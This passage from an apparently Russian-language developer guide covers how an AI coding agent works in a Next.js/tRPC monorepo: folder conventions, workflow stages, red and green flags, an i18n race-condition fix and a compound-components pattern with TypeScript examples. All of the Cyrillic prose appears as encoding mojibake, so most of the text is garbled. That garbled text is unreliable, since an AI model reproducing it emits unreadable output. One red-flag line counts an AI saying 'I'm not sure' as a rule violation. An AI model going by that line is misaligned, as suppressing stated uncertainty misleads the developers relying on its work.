üìù **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: –°–æ–∑–¥–∞–µ—Ç—Å—è –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –∫–∏—Ä–ø–∏—á–∏–∫ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞

### **–ö–æ–≥–¥–∞ AI –≥–æ–≤–æ—Ä–∏—Ç: "–î–æ–±–∞–≤–ª—é API endpoint"**

üîç **–ò—â–∏—Ç–µ –≤**: `apps/web/src/server/trpc/routers/`
üìù **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: –°–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤–∞—è —Ç–æ—á–∫–∞ –¥–ª—è –æ–±—â–µ–Ω–∏—è —Ñ—Ä–æ–Ω—Ç–∞ —Å –±—ç–∫–æ–º

### **–ö–æ–≥–¥–∞ AI –≥–æ–≤–æ—Ä–∏—Ç: "–î–æ–±–∞–≤–ª—é —Ö—É–∫"**

üîç **–ò—â–∏—Ç–µ –≤**: `packages/hooks/src/`
üìù **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: –°–æ–∑–¥–∞–µ—Ç—Å—è –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–µ–º

### **–ö–æ–≥–¥–∞ AI –≥–æ–≤–æ—Ä–∏—Ç: "–î–æ–±–∞–≤–ª—é –≤–∞–ª–∏–¥–∞—Ü–∏—é"**

üîç **–ò—â–∏—Ç–µ –≤**: `packages/utils/src/validation/`
üìù **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: –°–æ–∑–¥–∞–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Å –∑–∞—â–∏—Ç–æ–π –æ—Ç XSS –∞—Ç–∞–∫

---

## üéØ **–ß–¢–û AI –î–ï–õ–ê–ï–¢ –ö–û–ì–î–ê –ü–ò–®–ï–¢ –ö–û–î**

### **‚úÖ –•–æ—Ä–æ—à–∏–µ –ø—Ä–∞–∫—Ç–∏–∫–∏ (—á—Ç–æ AI –¥–æ–ª–∂–µ–Ω –¥–µ–ª–∞—Ç—å)**

1. **–ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ** - –∏—â–µ—Ç –≥–æ—Ç–æ–≤—ã–µ —Ä–µ—à–µ–Ω–∏—è –≤–º–µ—Å—Ç–æ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤—ã—Ö
2. **–¢–∏–ø–∏–∑–∞—Ü–∏—è** - –≤—Å–µ –¥–∞–Ω–Ω—ã–µ —Å—Ç—Ä–æ–≥–æ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω—ã (–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å)
3. **–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–∞—Ü–∏—è** - –≤—Å–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã, —Å—Ç–∏–ª–∏, –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –≤ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö –º–µ—Å—Ç–∞—Ö
4. **–¢–µ—Å—Ç–∏—Ä—É–µ–º–æ—Å—Ç—å** - –∫–æ–¥ –ª–µ–≥–∫–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å
5. **–ß–∏—Ç–∞–µ–º–æ—Å—Ç—å** - –¥—Ä—É–≥–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–π–º–µ—Ç –∫–æ–¥

### **‚ùå –ü–ª–æ—Ö–∏–µ –ø—Ä–∞–∫—Ç–∏–∫–∏ (—á–µ–≥–æ AI –∏–∑–±–µ–≥–∞–µ—Ç)**

1. **–î—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ** - –Ω–µ —Å–æ–∑–¥–∞–µ—Ç —Ç–æ, —á—Ç–æ —É–∂–µ –µ—Å—Ç—å
2. **–•–∞—Ä–¥–∫–æ–¥** - –Ω–µ –≤–±–∏–≤–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è –ø—Ä—è–º–æ –≤ –∫–æ–¥
3. **–ù–∞—Ä—É—à–µ–Ω–∏–µ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã** - –Ω–µ —Å—Ç–∞–≤–∏—Ç –∫–æ–¥ –Ω–µ –≤ —Ç–µ –ø–∞–ø–∫–∏
4. **–ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–∏–ø–æ–≤** - –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `any` –≤ TypeScript
5. **–ù–µ–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ—Å—Ç—å** - –Ω–µ —Å–æ–∑–¥–∞–µ—Ç –º–µ–¥–ª–µ–Ω–Ω—ã–π –∫–æ–¥

---

## üìã **–ê–õ–ì–û–†–ò–¢–ú –†–ê–ë–û–¢–´ AI –ê–ì–ï–ù–¢–ê**

### **–≠—Ç–∞–ø 1: –ü–æ–Ω–∏–º–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏**

1. –ß–∏—Ç–∞–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è
2. –ò–∑—É—á–∞–µ—Ç –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É –ø—Ä–æ–µ–∫—Ç–∞ (`PROJECT_STRUCTURE_MAP.md`)
3. –ò—â–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ä–µ—à–µ–Ω–∏—è

### **–≠—Ç–∞–ø 2: –ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ**

1. –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∫–∞–∫–∏–µ —É—Ä–æ–≤–Ω–∏ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –∑–∞—Ç—Ä–æ–Ω—É—Ç—ã
2. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å
3. –ü–ª–∞–Ω–∏—Ä—É–µ—Ç –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è

### **–≠—Ç–∞–ø 3: –†–µ–∞–ª–∏–∑–∞—Ü–∏—è**

1. –°–æ–∑–¥–∞–µ—Ç/–∏–∑–º–µ–Ω—è–µ—Ç –∫–æ–¥ –ø–æ –ø–ª–∞–Ω—É
2. –°–ª–µ–¥—É–µ—Ç –ø—Ä–∞–≤–∏–ª–∞–º –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã
3. –ò–Ω—Ç–µ–≥—Ä–∏—Ä—É–µ—Ç —Å —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–º –∫–æ–¥–æ–º

### **–≠—Ç–∞–ø 4: –ü—Ä–æ–≤–µ—Ä–∫–∞**

1. –¢–µ—Å—Ç–∏—Ä—É–µ—Ç —á—Ç–æ –≤—Å–µ —Ä–∞–±–æ—Ç–∞–µ—Ç
2. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è
3. –£–±–µ–∂–¥–∞–µ—Ç—Å—è —á—Ç–æ –∑–∞–¥–∞—á–∞ —Ä–µ—à–µ–Ω–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é

---

## üö® **–°–ò–ì–ù–ê–õ–´ –ß–¢–û –°–¢–û–ò–¢ –û–ë–†–ê–¢–ò–¢–¨ –í–ù–ò–ú–ê–ù–ò–ï**

### **üî¥ –ö—Ä–∞—Å–Ω—ã–µ —Ñ–ª–∞–≥–∏ (–ø—Ä–æ–±–ª–µ–º—ã)**

- AI —Å–æ–∑–¥–∞–µ—Ç –º–Ω–æ–≥–æ –Ω–æ–≤—ã—Ö —Ñ–∞–π–ª–æ–≤ (–≤–æ–∑–º–æ–∂–Ω–æ, –¥—É–±–ª–∏—Ä—É–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ)
- AI –≥–æ–≤–æ—Ä–∏—Ç "—è –Ω–µ —É–≤–µ—Ä–µ–Ω" (–Ω–∞—Ä—É—à–µ–Ω–∏–µ Rule 8 - –∑–∞–ø—Ä–µ—Ç –ø—Ä–µ–¥–ø–æ–ª–æ–∂–µ–Ω–∏–π)
- AI –º–µ–Ω—è–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –±–µ–∑ –æ–±—ä—è—Å–Ω–µ–Ω–∏—è
- AI —Å–æ–∑–¥–∞–µ—Ç inline CSS –∏–ª–∏ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –≤ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞—Ö
- **üö® –ö–†–ò–¢–ò–ß–ù–û**: Translation keys –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç—Å—è –≤–º–µ—Å—Ç–æ –ø–µ—Ä–µ–≤–æ–¥–æ–≤ –ø—Ä–∏ navigation (race condition –≤ i18n)

### **‚ö†Ô∏è I18N Race Condition - –ß—Ç–æ —ç—Ç–æ –∏ –∫–∞–∫ –∏–∑–±–µ–∂–∞—Ç—å**

**–ü—Ä–æ–±–ª–µ–º–∞**: –ü–æ—Å–ª–µ `router.push('/new-page')` –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç—Å—è –∫–ª—é—á–∏ –ø–µ—Ä–µ–≤–æ–¥–æ–≤ (`Button.submit` –≤–º–µ—Å—Ç–æ "–û—Ç–ø—Ä–∞–≤–∏—Ç—å")

**–ü–æ—á–µ–º—É –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: Next.js —Ä–µ–Ω–¥–µ—Ä–∏—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—É –±—ã—Å—Ç—Ä–µ–µ, —á–µ–º –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –ø–µ—Ä–µ–≤–æ–¥—ã –¥–ª—è –Ω–æ–≤–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –µ—Å–ª–∏ –∞–≤—Ç–æ–ø–µ—Ä–µ–≤–æ–¥—á–∏–∫ –≤ —Ä–µ—Å—Ç–æ—Ä–∞–Ω–µ –Ω–µ —É—Å–ø–µ–≤–∞–µ—Ç –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –º–µ–Ω—é –¥–ª—è –Ω–æ–≤–æ–≥–æ —Å—Ç–æ–ª–∏–∫–∞

**–†–µ—à–µ–Ω–∏–µ –¥–ª—è AI**:

```typescript
// ‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω–æ - –ø—Ä–µ–¥–∑–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä–µ–≤–æ–¥—ã –≤ –∏—Å—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ
// –í apps/web/src/i18n/request.ts –¥–æ–±–∞–≤–∏—Ç—å lazy dependency
'/exchange': {
  critical: ['advanced-exchange', 'layout'],
  lazy: ['order-page'], // ‚Üê –î–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ exchange ‚Üí order
}
```

**–ö–∞–∫ —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å**: –ü–µ—Ä–µ—Ä–µ–Ω–¥–µ—Ä (hot reload) –∏—Å–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–æ–±–ª–µ–º—É

### **üü¢ –ó–µ–ª–µ–Ω—ã–µ —Ñ–ª–∞–≥–∏ (–≤—Å–µ —Ö–æ—Ä–æ—à–æ)**

- AI –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã
- AI –æ–±—ä—è—Å–Ω—è–µ—Ç –ø–æ—á–µ–º—É –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ä–µ—à–µ–Ω–∏—è
- AI –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —á—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ
- AI —Å–ª–µ–¥—É–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–º –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º

---

## üìä **–ú–ï–¢–†–ò–ö–ò –ö–ê–ß–ï–°–¢–í–ê –†–ê–ë–û–¢–´**

### **–ò–∑–º–µ—Ä—è–µ–º—ã–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏:**

1. **–ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ** - % –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤
2. **–¢–∏–ø–∏–∑–∞—Ü–∏—è** - % –∫–æ–¥–∞ —Å —Å—Ç—Ä–æ–≥–∏–º–∏ —Ç–∏–ø–∞–º–∏
3. **–¢–µ—Å—Ç–∏—Ä—É–µ–º–æ—Å—Ç—å** - % –ø–æ–∫—Ä—ã—Ç–∏—è —Ç–µ—Å—Ç–∞–º–∏
4. **–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å** - –≤—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü
5. **–ß–∏—Ç–∞–µ–º–æ—Å—Ç—å** - —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º –∫–æ–¥–∞

### **–¶–µ–ª–∏ –ø—Ä–æ–µ–∫—Ç–∞:**

- üéØ **>90%** –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Ä–µ—à–µ–Ω–∏–π
- üéØ **100%** —Ç–∏–ø–∏–∑–∞—Ü–∏—è (–Ω–∏–∫–∞–∫–∏—Ö `any`)
- üéØ **>80%** –ø–æ–∫—Ä—ã—Ç–∏–µ —Ç–µ—Å—Ç–∞–º–∏ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–≥–æ –∫–æ–¥–∞
- üéØ **<3 —Å–µ–∫** –≤—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü
- üéØ **0** –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–¥–∞

---

## üîß **–û–°–ù–û–í–ù–´–ï –ö–û–ú–ê–ù–î–´ –†–ê–ó–†–ê–ë–û–¢–ö–ò**

```bash
# –ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –≤ —Ä–µ–∂–∏–º–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏
npm run dev

# –°–±–æ—Ä–∫–∞ –≤—Å–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞
npm run build

# –ó–∞–ø—É—Å–∫ —Ç–µ—Å—Ç–æ–≤
npm run test

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞—á–µ—Å—Ç–≤–∞ –∫–æ–¥–∞
npm run lint

# –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤
npm run storybook
```

---

## üìö **–ü–û–õ–ï–ó–ù–´–ï –°–°–´–õ–ö–ò –î–õ–Ø –£–ì–õ–£–ë–õ–ï–ù–ò–Ø**

### **–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è:**

- `docs/core/DEVELOPER_GUIDE.md` - –ø–æ–¥—Ä–æ–±–Ω–æ–µ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞
- `docs/core/ARCHITECTURE.md` - –¥–µ—Ç–∞–ª—å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞
- `docs/core/PROJECT_STRUCTURE_MAP.md` - –∫–∞—Ä—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –ø—Ä–æ–µ–∫—Ç–∞

### **AI –∞–≥–µ–Ω—Ç –ø—Ä–∞–≤–∏–ª–∞:**

- `docs/ai-agent/ai-agent-rules.yml` - 24 –ø—Ä–∞–≤–∏–ª–∞ —Ä–∞–±–æ—Ç—ã AI –∞–≥–µ–Ω—Ç–∞

### **–°–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞:**

- `docs/core/VALIDATION_ARCHITECTURE_GUIDE.md` - —Å–∏—Å—Ç–µ–º–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
- `docs/core/SECURITY_ENHANCED_VALIDATION_GUIDE.md` - –∑–∞—â–∏—Ç–∞ –æ—Ç XSS –∞—Ç–∞–∫

---

## ÔøΩ **–ü–ê–¢–¢–ï–†–ù–´ –†–ï–ê–õ–ò–ó–ê–¶–ò–ò –í –ü–†–û–ï–ö–¢–ï - –í–°–ï 100%**

> **–ß—Ç–æ —ç—Ç–æ**: –ö–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –∫–∞–∫ —á—Ç–æ-—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –≤ —ç—Ç–æ–π –∫–æ–¥–æ–≤–æ–π –±–∞–∑–µ. AI –∞–≥–µ–Ω—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —ç—Ç–∏ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –ø—Ä–∏ –Ω–∞–ø–∏—Å–∞–Ω–∏–∏ –∫–æ–¥–∞.

### üèóÔ∏è **–ü–∞—Ç—Ç–µ—Ä–Ω 1: Compound Components (–°–æ—Å—Ç–∞–≤–Ω—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ —Å–ª–æ–∂–Ω—ã–µ UI –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã (`packages/ui/src/components/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –≥–¥–µ –≥–ª–∞–≤–Ω–∞—è —á–∞—Å—Ç—å + –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –±–ª–æ–∫–∏ = –≥–æ—Ç–æ–≤–æ–µ —Ä–µ—à–µ–Ω–∏–µ

#### üß† **–î–ï–¢–ê–õ–¨–ù–û–ï –û–ë–™–Ø–°–ù–ï–ù–ò–ï –ü–ê–¢–¢–ï–†–ù–ê**

**–ü—Ä–æ–±–ª–µ–º–∞ –∫–æ—Ç–æ—Ä—É—é —Ä–µ—à–∞–µ—Ç:**
–û–±—ã—á–Ω—ã–µ React –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –±—ã—Å—Ç—Ä–æ —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω–Ω—ã–º–∏ –ø—Ä–æ–ø—Å–∞–º–∏. –ù–∞–ø—Ä–∏–º–µ—Ä, —Ñ–æ—Ä–º–∞ –æ–±–º–µ–Ω–∞ –≤–∞–ª—é—Ç –º–æ–≥–ª–∞ –±—ã –∏–º–µ—Ç—å 20+ –ø—Ä–æ–ø—Å–æ–≤:

```typescript
// ‚ùå –ü–ª–æ—Ö–æ: —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –ø—Ä–æ–ø—Å–æ–≤
<ExchangeForm
  headerTitle="–û–±–º–µ–Ω –≤–∞–ª—é—Ç"
  showFromSection={true}
  fromCurrency="BTC"
  toCurrency="USDT"
  onFromChange={...}
  onToChange={...}
  submitButtonText="–û–±–º–µ–Ω—è—Ç—å"
  isSubmitting={false}
  showAdvanced={false}
  // –µ—â–µ 15 –ø—Ä–æ–ø—Å–æ–≤...
/>
```

**–†–µ—à–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Compound Components:**

```typescript
// ‚úÖ –•–æ—Ä–æ—à–æ: –∫–æ–º–ø–æ–∑–∏—Ü–∏—è –∏–∑ –±–ª–æ–∫–æ–≤
<ExchangeForm>
  <ExchangeForm.Header>–û–±–º–µ–Ω –≤–∞–ª—é—Ç</ExchangeForm.Header>
  <ExchangeForm.FromSection
    currency="BTC"
    onChange={handleFromChange}
  />
  <ExchangeForm.ToSection
    currency="USDT"
    onChange={handleToChange}
  />
  <ExchangeForm.SubmitButton loading={isSubmitting}>
    –û–±–º–µ–Ω—è—Ç—å
  </ExchangeForm.SubmitButton>
</ExchangeForm>
```

#### üîß **–ö–ê–ö –≠–¢–û –†–ê–ë–û–¢–ê–ï–¢ –¢–ï–•–ù–ò–ß–ï–°–ö–ò**

**1. –ö–æ–Ω—Ç–µ–∫—Å—Ç –¥–ª—è –æ–±–º–µ–Ω–∞ –¥–∞–Ω–Ω—ã–º–∏:**

```typescript
// –°–æ–∑–¥–∞–µ—Ç—Å—è Context –¥–ª—è —Å–≤—è–∑–∏ –º–µ–∂–¥—É –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏
const ExchangeFormContext = createContext<ExchangeFormContextValue>();

// –ì–ª–∞–≤–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –∫–æ–Ω—Ç–µ–∫—Å—Ç
const ExchangeForm = ({ children }) => {
  const [exchangeData, setExchangeData] = useState({});

  return (
    <ExchangeFormContext.Provider value={{ exchangeData, setExchangeData }}>
      <form className="exchange-form">
        {children}
      </form>
    </ExchangeFormContext.Provider>
  );
};
```

**2. –î–æ—á–µ—Ä–Ω–∏–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –ø–æ–ª—É—á–∞—é—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞:**

```typescript
// –ö–∞–∂–¥—ã–π –±–ª–æ–∫ –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –æ–±—â–∏–µ –¥–∞–Ω–Ω—ã–µ
const FromSection = ({ currency, onChange }) => {
  const { exchangeData, setExchangeData } = useContext(ExchangeFormContext);

  return (
    <div className="from-section">
      {/* –õ–æ–≥–∏–∫–∞ —Å–µ–∫—Ü–∏–∏ */}
    </div>
  );
};
```

**3. –≠–∫—Å–ø–æ—Ä—Ç —Å–æ—Å—Ç–∞–≤–Ω–æ–≥–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞:**

```typescript
// Object.assign —Å–≤—è–∑—ã–≤–∞–µ—Ç –≥–ª–∞–≤–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —Å –±–ª–æ–∫–∞–º–∏
export const ExchangeFormCompound = Object.assign(ExchangeForm, {
  Header: HeaderSection,
  FromSection,
  ToSection,
  SubmitButton,
});
```

#### üéØ **–ü–†–ï–ò–ú–£–©–ï–°–¢–í–ê –≠–¢–û–ì–û –ü–û–î–•–û–î–ê**

**1. –ì–∏–±–∫–æ—Å—Ç—å –∫–æ–º–ø–æ–∑–∏—Ü–∏–∏:**

- –ú–æ–∂–Ω–æ —Å–æ–±–∏—Ä–∞—Ç—å —Ä–∞–∑–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã —Ñ–æ—Ä–º—ã –∏–∑ –æ–¥–Ω–∏—Ö –±–ª–æ–∫–æ–≤
- –õ–µ–≥–∫–æ –¥–æ–±–∞–≤–ª—è—Ç—å/—É–±–∏—Ä–∞—Ç—å —Å–µ–∫—Ü–∏–∏ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏—è API

**2. –ß–µ—Ç–∫–∞—è –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å:**

- –ö–∞–∂–¥—ã–π –±–ª–æ–∫ –æ—Ç–≤–µ—á–∞–µ—Ç —Ç–æ–ª—å–∫–æ –∑–∞ —Å–≤–æ—é —Ñ—É–Ω–∫—Ü–∏—é
- –õ–æ–≥–∏–∫–∞ –Ω–µ —Å–º–µ—à–∏–≤–∞–µ—Ç—Å—è –≤ –æ–¥–Ω–æ–º –±–æ–ª—å—à–æ–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–µ

**3. –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**

- –ë–ª–æ–∫–∏ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –¥—Ä—É–≥–∏—Ö —Ñ–æ—Ä–º–∞—Ö
- –ù–µ –Ω—É–∂–Ω–æ –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å –ª–æ–≥–∏–∫—É —Å–µ–∫—Ü–∏–π

**4. –ß–∏—Ç–∞–µ–º–æ—Å—Ç—å –∫–æ–¥–∞:**

```typescript
// –°—Ä–∞–∑—É –≤–∏–¥–Ω–æ —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–æ—Ä–º—ã
<ExchangeForm>
  <ExchangeForm.Header />      {/* –ó–∞–≥–æ–ª–æ–≤–æ–∫ */}
  <ExchangeForm.FromSection /> {/* –û—Ç–∫—É–¥–∞ –æ–±–º–µ–Ω–∏–≤–∞–µ–º */}
  <ExchangeForm.ToSection />   {/* –ö—É–¥–∞ –æ–±–º–µ–Ω–∏–≤–∞–µ–º */}
  <ExchangeForm.SubmitButton />{/* –ö–Ω–æ–ø–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ */}
</ExchangeForm>
```

#### ‚ö†Ô∏è **–ß–¢–û –ü–†–û–ò–°–•–û–î–ò–¢ –ë–ï–ó –≠–¢–û–ì–û –ü–ê–¢–¢–ï–†–ù–ê**

**–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ 1: –û–¥–∏–Ω –±–æ–ª—å—à–æ–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç**

```typescript
// ‚ùå –ú–æ–Ω–æ–ª–∏—Ç–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç - 500+ —Å—Ç—Ä–æ–∫ –∫–æ–¥–∞
const ExchangeForm = ({ headerProps, fromProps, toProps, submitProps }) => {
  // –õ–æ–≥–∏–∫–∞ –≤—Å–µ—Ö —Å–µ–∫—Ü–∏–π –≤–ø–µ—Ä–µ–º–µ—à–∫—É
  // –¢—Ä—É–¥–Ω–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å
  // –¢—Ä—É–¥–Ω–æ –∏–∑–º–µ–Ω—è—Ç—å
};
```

**–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ 2: –ú–Ω–æ–≥–æ –æ—Ç–¥–µ–ª—å–Ω—ã—Ö –ø—Ä–æ–ø—Å–æ–≤**

```typescript
// ‚ùå Props drilling - –ø–µ—Ä–µ–¥–∞—á–∞ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ –≤—Å–µ —É—Ä–æ–≤–Ω–∏
const App = () => (
  <ExchangeFormWrapper>
    <HeaderSection title={title} />
    <FromSection
      currency={fromCurrency}
      amount={fromAmount}
      rate={exchangeRate}
      onCurrencyChange={onFromCurrencyChange}
      onAmountChange={onFromAmountChange}
    />
    {/* –ö–∞–∂–¥–∞—è —Å–µ–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ –ø—Ä–æ–ø—Å–æ–≤ */}
  </ExchangeFormWrapper>
);
```

#### üõ†Ô∏è **–ö–û–ì–î–ê AI –ò–°–ü–û–õ–¨–ó–£–ï–¢ –≠–¢–û–¢ –ü–ê–¢–¢–ï–†–ù**

**–¢—Ä–∏–≥–≥–µ—Ä—ã –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è Compound Component:**

